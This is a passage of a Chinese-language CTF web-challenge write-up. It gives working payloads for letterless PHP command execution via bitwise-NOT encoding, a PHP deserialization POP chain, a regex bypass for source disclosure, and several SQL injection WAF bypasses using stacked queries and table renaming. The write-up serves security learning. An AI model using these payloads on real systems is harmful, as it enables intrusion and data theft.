编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<p>此题 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br><span class=\"line\"></span><br><span class=\"line\">system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>\n<p><strong>深刻学习无字母 rce 来这里</strong></p>\n<h3 id=\"9pop\"><a class=\"markdownIt-Anchor\" href=\"#9pop\">#</a> 9.pop</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$admin</span> = <span class=\"string\">&#x27;aaa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span> = <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Getflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;admin === <span class=\"string\">&#x27;w44m&#x27;</span> &amp;&amp; <span class=\"variable language_\">$this</span>-&gt;passwd === <span class=\"string\">&#x27;08067&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;admin;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;passwd;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nono&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;w00m;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;w00m-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;w22m&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$w00m</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;w00m&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$w00m</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>入口:w22m.destruct, 让 w22m 的 $woom 为 w33m 对象，调用 w33m 的 toString 方法，让 w33m 的 <code>w00m</code>  为 w44m 对象，w22m 为字符串’Getflag ()’, 就能调用 w44m 的 Getflag () 方法<br>\n构造脚本:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"variable\">$admin</span>=<span class=\"string\">&#x27;w44m&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span>=<span class=\"string\">&#x27;08067&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w22m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w33m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w44m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w22m=<span class=\"string\">&#x27;Getflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<p>payload1:(加 %00)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>payload2:(直接用 url 编码后的)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>\n<h3 id=\"10easyp\"><a class=\"markdownIt-Anchor\" href=\"#10easyp\">#</a> 10.EasyP</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;utils.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$guess</span> = (<span class=\"keyword\">string</span>) <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$guess</span> === <span class=\"variable\">$secret</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Congratulations! The flag is: &#x27;</span> . <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/utils\\.php\\/*$/i&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/show_source/&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REQUEST_URI&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>1. <code>$_SERVER['PHP_SELF']</code> <br>\n 返回的是当前正在执行的脚本的相对路径<br>\n 2.basename ()<br>\n 返回给定路径的最后一个组成部分，不包括查询参数和父目录，回当前执行的 PHP 脚本的文件名<br>\n eg.<br>\n![[Pasted image 20230428144618.png]]<br>\n![[Pasted image 20230428144802.png]]<br>\n <code>$_SERVER['REQUEST_URI']</code> <br>\n 包含了当前正在执行的脚本的相对路径以及任何查询字符串<br>\n！[[Pasted image 20230428145113.png]]<br>\n 怎么绕过呢？</p>\n<ol>\n<li>可以在 utils.php 后加一个字符，比如 % ff (非 ASCII 字符), 随便一个汉字给 url 编码就行，绕过第一个 preg_match 并且 basename () 无法处理非 ASCII 字符会直接获取 utils.php</li>\n<li>第二个正则绕过方式是加 Url 编码绕过，参数名至少需要一个或者以上进行 Url 编码或者 show.source, <code>show[source</code> <br>\npayload:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php/utils.php/%ff?show.source=1</span><br><span class=\"line\">index.php/utils.php/%ff?show[source=1</span><br><span class=\"line\">index.php/utils.php/%ff?%73how_source=1</span><br><span class=\"line\">index.php/utils.php/%E5%93%88(中文汉字哈的url编码)?show.source=1</span><br><span class=\"line\">........</span><br></pre></td></tr></table></figure>\n<h3 id=\"11swpuctf-2021-新生赛sql\"><a class=\"markdownIt-Anchor\" href=\"#11swpuctf-2021-新生赛sql\">#</a> 11.[SWPUCTF 2021 新生赛] sql</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=1 正常</span><br><span class=\"line\">?wllm=1&#x27; 报语法错误</span><br><span class=\"line\">?wllm=1&#x27;--+ 有waf,疑似过滤+,换了#发现也被过滤</span><br><span class=\"line\">?wllm=1&#x27;%23  正常,用url绕过</span><br><span class=\"line\">经过测试此题过滤了空格和等号</span><br><span class=\"line\">空格=&gt;/**/</span><br><span class=\"line\">等号=&gt;like</span><br><span class=\"line\">开始注入</span><br><span class=\"line\">?wllm=1&#x27;order/**/by/**/3%23  正常,4就错误,所以字段为3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,3%23  回显位是2和3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/databse()%23</span><br><span class=\"line\">发现LTLT_flag(flag应该在这里),users</span><br><span class=\"line\">查列常规操作</span><br><span class=\"line\">得到id,flag,id,username</span><br><span class=\"line\">查内容这里只能看到前面,substr,right,reverse都被过滤,只能用mid截取(因为回显只能有20个，所以1次20个)</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,mid(group_concat(flag),1,20)/**/from/**/LTLT_flag%23</span><br><span class=\"line\">读三次(0,20)(20,20)(40,20)</span><br></pre></td></tr></table></figure>\n<h3 id=\"12随便注\"><a class=\"markdownIt-Anchor\" href=\"#12随便注\">#</a> 12. 随便注</h3>\n<p>字符型，过滤了 select,update,delete,drop,insert,where 和., 不区分大小写</p>\n<h4 id=\"116进制编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#116进制编码绕过\">#</a> 1.16 进制编码绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from `1919810931114514`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2其他函数替代\"><a class=\"markdownIt-Anchor\" href=\"#2其他函数替代\">#</a> 2. 其他函数替代</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3alter注入\"><a class=\"markdownIt-Anchor\" href=\"#3alter注入\">#</a> 3.alter 注入</h4>\n<p>修改表名 <code>alter table 表名 rename 新表名;</code> <br>\n 修改字段名 <code>alter table 表名 change 旧字段名 新字段名 类型;</code> <br>\npayload:<br>\n 修改 words 表名为 words1<br>\n <code>alter table words rename words1;</code> <br>\n 修改 1919810931114514 表名为 words<br>\n <code>alter table 1919810931114514 rename words;</code> <br>\n 修改新的 words 表中的 flag 列名为 id<br>\n <code>alter table words change flag id varchar(60);</code> <br>\n 结合:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;alter table words rename words1;alter table` 1919810931114514 `rename words;alter table words change flag id varchar(60);#</span></span><br></pre></td></tr></table></figure>\n<p>然后查 id=1 就行</p>\n<h3 id=\"13level-up\"><a class=\"markdownIt-Anchor\" href=\"#13level-up\">#</a> 13.level-up</h3>\n<p>先查看源代码发现这个注释</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- here is level 1 --&gt;</span><br><span class=\"line\">&lt;!-- disallow: --&gt;</span><br></pre></td></tr></table></figure>\n<p>说明要看 robots.txt, 发现 level_2_1s_h3re.php<br>\n (string) 用法:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_num</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$num</span>; <span class=\"comment\">// 结果: &quot;3&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$bool</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_bool</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$bool</span>; <span class=\"comment\">// 结果: &quot;1&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$null_value</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_null_value</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$null_value</span>; <span class=\"comment\">// 结果: &quot;&quot;（空字符串），字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$arr</span> = <span class=\"keyword\">array</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"variable\">$str_arr</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$arr</span>; <span class=\"comment\">// 结果: &quot;Array&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$obj</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">stdClass</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj</span>-&gt;name = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_obj</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$obj</span>; <span class=\"comment\">// 结果: &quot;stdClass Object&quot;，字符串类型</span></span><br></pre></td></tr></table></figure>\n<p>数组绕过失效，要 md5 强碰撞<br>\n 